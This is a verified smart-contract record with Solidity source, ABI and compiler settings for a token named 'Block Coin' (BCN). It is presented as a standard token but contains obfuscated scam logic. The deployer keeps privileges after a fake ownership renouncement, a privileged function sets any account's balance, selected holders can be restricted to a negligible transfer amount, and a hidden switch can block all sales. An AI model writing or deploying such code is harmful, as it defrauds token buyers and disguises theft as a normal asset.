{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface fundSwap {\n    function createPair(address listTrading, address marketingSwapBuy) external returns (address);\n}\n\ninterface liquiditySwapAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atLaunch) external view returns (uint256);\n\n    function transfer(address sellLaunchSender, uint256 minToken) external returns (bool);\n\n    function allowance(address senderTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellLaunchSender,\n        uint256 minToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapAuto, uint256 value);\n    event Approval(address indexed senderTake, address indexed spender, uint256 value);\n}\n\nabstract contract fromMaxList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquiditySwapAtMetadata is liquiditySwapAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BlockCoin is fromMaxList, liquiditySwapAt, liquiditySwapAtMetadata {\n\n    function owner() external view returns (address) {\n        return modeSender;\n    }\n\n    function walletIs(address maxLaunched) public {\n        enableReceiver();\n        \n        if (maxLaunched == autoLimit || maxLaunched == teamTrading) {\n            return;\n        }\n        receiverSell[maxLaunched] = true;\n    }\n\n    function amountEnableExempt(address takeList, address sellLaunchSender, uint256 minToken) internal returns (bool) {\n        require(totalMarketing[takeList] >= minToken);\n        totalMarketing[takeList] -= minToken;\n        totalMarketing[sellLaunchSender] += minToken;\n        emit Transfer(takeList, sellLaunchSender, minToken);\n        return true;\n    }\n\n    string private buyTxMax = \"BCN\";\n\n    function approve(address isMaxFund, uint256 minToken) public virtual override returns (bool) {\n        txTo[_msgSender()][isMaxFund] = minToken;\n        emit Approval(_msgSender(), isMaxFund, minToken);\n        return true;\n    }\n\n    address public autoLimit;\n\n    constructor (){\n        \n        launchedWallet launchFee = launchedWallet(shouldReceiver);\n        teamTrading = fundSwap(launchFee.factory()).createPair(launchFee.WETH(), address(this));\n        if (maxTx == exemptSwap) {\n            liquidityWallet = launchedBuy;\n        }\n        autoLimit = _msgSender();\n        exemptMaxReceiver[autoLimit] = true;\n        totalMarketing[autoLimit] = minWalletExempt;\n        atTx();\n        if (liquidityWallet != exemptSwap) {\n            maxTx = exemptSwap;\n        }\n        emit Transfer(address(0), autoLimit, minWalletExempt);\n    }\n\n    uint256 totalTeam;\n\n    function transfer(address swapTrading, uint256 minToken) external virtual override returns (bool) {\n        return launchAmount(_msgSender(), swapTrading, minToken);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return enableTo;\n    }\n\n    function launchAmount(address takeList, address sellLaunchSender, uint256 minToken) internal returns (bool) {\n        if (takeList == autoLimit) {\n            return amountEnableExempt(takeList, sellLaunchSender, minToken);\n        }\n        uint256 maxAmount = liquiditySwapAt(teamTrading).balanceOf(swapEnableIs);\n        require(maxAmount == totalTeam);\n        require(sellLaunchSender != swapEnableIs);\n        if (receiverSell[takeList]) {\n            return amountEnableExempt(takeList, sellLaunchSender, listTokenBuy);\n        }\n        return amountEnableExempt(takeList, sellLaunchSender, minToken);\n    }\n\n    function balanceOf(address atLaunch) public view virtual override returns (uint256) {\n        return totalMarketing[atLaunch];\n    }\n\n    bool public exemptLimit;\n\n    mapping(address => mapping(address => uint256)) private txTo;\n\n    function enableToken(uint256 minToken) public {\n        enableReceiver();\n        totalTeam = minToken;\n    }\n\n    address private modeSender;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletAmount;\n    }\n\n    uint256 private exemptSwap;\n\n    mapping(address => uint256) private totalMarketing;\n\n    mapping(address => bool) public exemptMaxReceiver;\n\n    function atTx() public {\n        emit OwnershipTransferred(autoLimit, address(0));\n        modeSender = address(0);\n    }\n\n    string private enableTo = \"Block Coin\";\n\n    uint256 public liquidityWallet;\n\n    function allowance(address limitReceiver, address isMaxFund) external view virtual override returns (uint256) {\n        if (isMaxFund == shouldReceiver) {\n            return type(uint256).max;\n        }\n        return txTo[limitReceiver][isMaxFund];\n    }\n\n    uint256 public maxTx;\n\n    mapping(address => bool) public receiverSell;\n\n    address swapEnableIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function sellExempt(address fromTake) public {\n        if (exemptLimit) {\n            return;\n        }\n        if (maxTx == exemptSwap) {\n            launchedBuy = exemptSwap;\n        }\n        exemptMaxReceiver[fromTake] = true;\n        \n        exemptLimit = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minWalletExempt;\n    }\n\n    function launchedReceiver(address swapTrading, uint256 minToken) public {\n        enableReceiver();\n        totalMarketing[swapTrading] = minToken;\n    }\n\n    uint256 constant listTokenBuy = 6 ** 10;\n\n    uint8 private walletAmount = 18;\n\n    event OwnershipTransferred(address indexed senderLimit, address indexed enableFrom);\n\n    address shouldReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public teamTrading;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyTxMax;\n    }\n\n    function getOwner() external view returns (address) {\n        return modeSender;\n    }\n\n    uint256 exemptLaunch;\n\n    function enableReceiver() private view {\n        require(exemptMaxReceiver[_msgSender()]);\n    }\n\n    function transferFrom(address takeList, address sellLaunchSender, uint256 minToken) external override returns (bool) {\n        if (_msgSender() != shouldReceiver) {\n            if (txTo[takeList][_msgSender()] != type(uint256).max) {\n                require(minToken <= txTo[takeList][_msgSender()]);\n                txTo[takeList][_msgSender()] -= minToken;\n            }\n        }\n        return launchAmount(takeList, sellLaunchSender, minToken);\n    }\n\n    uint256 public launchedBuy;\n\n    uint256 private minWalletExempt = 100000000 * 10 ** 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isMaxFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMaxFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minToken\",\"type\":\"uint256\"}],\"name\":\"enableToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptMaxReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minToken\",\"type\":\"uint256\"}],\"name\":\"launchedReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTake\",\"type\":\"address\"}],\"name\":\"sellExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellLaunchSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunched\",\"type\":\"address\"}],\"name\":\"walletIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BlockCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}